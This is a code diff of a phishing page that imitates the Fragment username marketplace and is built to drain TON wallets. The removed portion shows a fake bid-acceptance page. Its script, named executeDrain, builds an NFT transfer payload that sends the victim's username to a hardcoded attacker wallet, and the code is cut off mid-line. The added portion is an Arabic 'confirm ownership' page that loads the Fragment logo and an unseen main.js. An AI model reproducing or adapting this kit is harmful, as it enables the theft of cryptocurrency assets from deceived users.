@@ -1,63 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment — Buy & Sell Usernames</title>
+    <title>Fragment | Connect Wallet</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tonweb/0.0.66/tonweb.js"></script>
     <style>
-        body { background-color: #0f172a; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin: 0; padding: 20px; }
-        .card { background: #1e293b; border-radius: 20px; padding: 30px; max-width: 400px; margin: 50px auto; box-shadow: 0 15px 35px rgba(0,0,0,0.5); border: 1px solid #334155; }
-        .user-tag { color: #38bdf8; font-size: 28px; font-weight: bold; margin-bottom: 10px; }
-        .price-label { color: #94a3b8; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
-        .price-value { font-size: 36px; color: #4ade80; margin: 15px 0; font-weight: 800; }
-        .btn-confirm { background: #0088cc; color: white; border: none; padding: 18px; border-radius: 14px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .btn-confirm:hover { background: #00aaff; }
-        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 25px; }
-        .footer-note { font-size: 12px; color: #64748b; margin-top: 20px; }
+        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 2rem; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
+        #connect-button { margin-top: 20px; }
+        .btn-confirm { background: #0088cc; border: none; padding: 12px 25px; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <div class="user-tag" id="target-user">@Loading...</div>
-        <div class="price-label">Current Highest Bid</div>
-        <div class="price-value">200.00 TON</div>
-        
-        <div id="ton-connect-button"></div>
-        
-        <button class="btn-confirm" onclick="executeDrain()">Confirm & Receive Payment</button>
-        
-        <div class="footer-note">
-            By confirming, you agree to transfer ownership to the highest bidder and receive funds to your connected wallet.
-        </div>
+        <img src="https://fragment.com/img/fragment_logo.svg" width="150" alt="Fragment">
+        <h3>تأكيد ملكية اليوزر</h3>
+        <p>قم بربط محفظتك لتأكيد يوزر <span id="target-user">@...</span></p>
+        <div id="connect-button"></div>
+        <button id="confirm-btn" class="btn-confirm">Confirm & Claim</button>
     </div>
 
-    <script>
-        // 1. إعداد واجهة TON Connect
-        const tonConnectUI = new TONConnectUI.TonConnectUI({
-            manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect-button'
-        });
-
-        // 2. جلب البيانات من الرابط (اليوزر وعنوان الـ NFT)
-        const params = new URLSearchParams(window.location.search);
-        const username = params.get('user') || "Username";
-        const nftAddress = params.get('nft');
-        document.getElementById('target-user').innerText = "@" + username;
-
-        // محفظتك التي ستستلم اليوزرات
-        const myWallet = "UQBRnk7BVLz9mtoCxpFMX4SHbqzihhlIyVWoISFyxHygG7Hp";
-
-        async function executeDrain() {
-            if (!nftAddress) {
-                alert("Error: NFT Address not found.");
-                return;
-            }
-
-            // 3. بناء الـ Payload (BOC) لنقل الملكية
-            const tonweb = new TonWeb();
-            const cell = new TonWeb.boc.Cell();
-            cell.bits.writeUint(0x5fcc3d14, 32); // op::transfer
-            cell.bits.writeUint(0
+    <script src="main.js"></script>
+</body>
+</html>
